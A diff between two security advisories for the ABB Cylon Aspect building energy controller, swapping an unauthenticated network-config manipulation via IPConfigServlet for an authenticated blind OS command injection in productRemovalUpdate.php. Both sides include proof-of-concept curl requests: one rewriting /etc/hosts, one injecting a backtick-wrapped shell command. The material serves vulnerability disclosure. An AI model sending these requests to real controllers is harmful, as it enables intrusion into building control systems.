@@ -1,5 +1,5 @@
 
-ABB Cylon Aspect 3.08.03 (MIX->IPConfigServlet) Network Manipulation
+ABB Cylon Aspect 3.08.03 (productRemovalUpdate.php) Remote Code Execution
 
 
 Vendor: ABB Ltd.
@@ -11,10 +11,11 @@ Summary: ASPECT is an award-winning scalable building energy management
 and control solution designed to allow users seamless access to their
 building data through standard building protocols including smart devices.
 
-Desc: ABB Cylon Aspect MIX's IPConfigServlet allows unauthenticated network
-config changes via the Host: 127.0.0.1 bypass, writing to /etc/hosts and
-config files. Attackers can redirect traffic (e.g. localhost to 1.2.3.4)
-or disrupt connectivity, amplifying impact with network restarts.
+Desc: The ABB BMS/BAS controller suffers from an authenticated blind OS command
+injection vulnerability. This can be exploited to inject and execute arbitrary
+shell commands through the 'instance' HTTP POST parameter called by the
+productRemovalUpdate.php script. The token (key POST param) needs to be set
+to 159 to trigger the command execution.
 
 Tested on: GNU/Linux 3.15.10 (armv7l)
            GNU/Linux 3.10.0 (x86_64)
@@ -39,8 +40,8 @@ Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                             @zeroscience
 
 
-Advisory ID: ZSL-2025-5944
-Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5944.php
+Advisory ID: ZSL-2025-5945
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5945.php
 
 
 21.04.2024
@@ -76,11 +77,6 @@ $ cat project
          ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░                                               
                                                                                                                
 
-$ curl http://192.168.73.31:7226/servlets/IPConfigServlet \
-> -H "Host: localhost" \
-> -d "config_change=1&ip=192.168.1.100&netmask=255.255.255.0&gateway=192.168.1.1&host0=segfault.mk&ip0=192.168.73.31"
-
-$ cat /etc/hosts
-127.0.0.1       localhost localhost.localdomain
-192.168.1.100       mix mix.localhost.localdomain
-192.168.73.31       segfault.mk
+$ curl http://192.168.73.31/productRemovalUpdate.php \
+> -H "Cookie: PHPSESSID=xxx" \
+> -d "key=159&instance=`sleep 7`"
